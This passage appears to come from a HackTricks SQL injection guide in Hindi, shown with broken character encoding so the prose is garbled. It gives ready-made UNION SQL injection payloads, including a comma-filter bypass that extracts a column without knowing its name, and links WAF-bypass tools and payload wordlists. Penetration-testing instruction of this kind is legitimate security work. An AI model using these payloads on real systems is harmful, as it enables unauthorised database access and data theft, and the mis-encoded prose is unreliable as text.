рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк **рдХрд┐рд╕реА рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рддреАрд╕рд░реЗ рдХреЙрд▓рдо рддрдХ рдкрд╣реБрдВрдЪреЗрдВ рдмрд┐рдирд╛ рдЙрд╕рдХреЗ рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ** рдЗрд╕рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рдХрд╛рд░ рдХрд╛ рдХреНрд╡реЗрд░реА рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, рдЗрд╕рд▓рд┐рдП рдПрдХ SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдореЗрдВ рдпрд╣ рдРрд╕рд╛ рджрд┐рдЦреЗрдЧрд╛:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
рдпрд╛ рдПрдХ **рдХреЙрдорд╛ рдмрд╛рдИрдкрд╛рд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
рдпрд╣ рдЯреНрд░рд┐рдХ [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/) рд╕реЗ рд▓реА рдЧрдИ рд╣реИред

### WAF рдмрд╛рдИрдкрд╛рд╕ рд╕реБрдЭрд╛рд╡ рдЙрдкрдХрд░рдг

{% embed url="https://github.com/m4ll0k/Atlas" %}

## рдЕрдиреНрдп рдЧрд╛рдЗрдб

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдбрд┐рдЯреЗрдХреНрд╢рди рд╕реВрдЪреА

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



тАЛ

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рд╕рдореНрдореЗрд▓рди рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рд╣рд░ рд╡рд┐рд╖рдп рдореЗрдВ рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рдиреЗ рдХрд╛ рд╕рдордп рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>
